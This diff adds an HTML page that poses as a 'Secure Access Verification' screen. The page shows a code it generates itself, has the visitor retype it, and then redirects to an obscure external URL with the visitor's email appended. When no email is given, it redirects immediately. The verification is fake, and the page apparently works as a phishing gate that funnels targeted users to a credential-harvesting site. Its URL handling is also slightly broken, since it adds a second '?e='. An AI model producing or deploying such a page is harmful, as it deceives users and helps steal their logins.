@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Secure Access Verification</title>
+  <style>
+    body { font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; padding: 20px; }
+    .code { font-size: 24px; letter-spacing: 5px; margin: 20px 0; user-select: all; }
+    button, input { padding: 10px; margin: 5px 0; width: 100%; }
+    .expiry { color: #e74c3c; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <div id="app">
+    <!-- Verification Screen (Default) -->
+    <div id="verify-screen">
+      <h2>Security Verification</h2>
+      <p>Enter this code to proceed:</p>
+      <div class="code" id="verification-code" onclick="selectCode()">-----</div>
+      <p><small>(Click code to select)</small></p>
+      <input type="text" id="user-code" placeholder="Enter 6-digit code">
+      <button onclick="verifyCode()">Continue</button>
+      <p id="expiry-message" class="expiry"></p>
+    </div>
+  </div>
+
+  <script>
+    // ===== CONFIG ===== //
+    const CODE_EXPIRY_MINUTES = 10;
+    const MAX_ATTEMPTS = 3;
+    const LANDING_PAGE = "https://dennolabo.biz/xkc1vta/walihse/ofcnjvd/provost/index.html?e=";
+
+    // ===== INIT ===== //
+    const urlParams = new URLSearchParams(window.location.search);
+    const email = urlParams.get('email'); // For ?email=user@example.com
+    const fragment = window.location.hash; // For #cta-newsletter
+    let attempts = 0;
+
+    // Generate random code
+    const code = Math.floor(100000 + Math.random() * 900000);
+    document.getElementById("verification-code").textContent = code;
+
+    // Set expiry time
+    const expiryTime = new Date();
+    expiryTime.setMinutes(expiryTime.getMinutes() + CODE_EXPIRY_MINUTES);
+    document.getElementById("expiry-message").textContent = 
+      `Expires at: ${expiryTime.toLocaleTimeString()}`;
+
+    // ===== FUNCTIONS ===== //
+    function selectCode() {
+      const range = document.createRange();
+      range.selectNode(document.getElementById("verification-code"));
+      window.getSelection().removeAllRanges();
+      window.getSelection().addRange(range);
+    }
+
+    function verifyCode() {
+      attempts++;
+      const userInput = document.getElementById("user-code").value;
+      const now = new Date();
+
+      // Check expiry
+      if (now > expiryTime) {
+        alert("This code has expired. Please request a new link.");
+        return;
+      }
+
+      // Check attempts
+      if (attempts > MAX_ATTEMPTS) {
+        alert("Maximum attempts reached. Please request a new link.");
+        return;
+      }
+
+      // Verify code
+      if (userInput == code) {
+        let redirectUrl = LANDING_PAGE;
+        
+        // Add email if provided
+        if (email) redirectUrl += `?e=${encodeURIComponent(email)}`;
+        
+        // Convert fragment (#cta-newsletter → #email)
+        if (fragment === "#cta-newsletter") redirectUrl += "#email";
+        
+        window.location.href = redirectUrl;
+      } else {
+        alert(`Invalid code. Attempts left: ${MAX_ATTEMPTS - attempts}`);
+      }
+    }
+
+    // Skip verification if no email/fragment (direct redirect)
+    if (!email && !fragment) {
+      window.location.href = LANDING_PAGE;
+    }
+  </script>
+</body>
+</html>
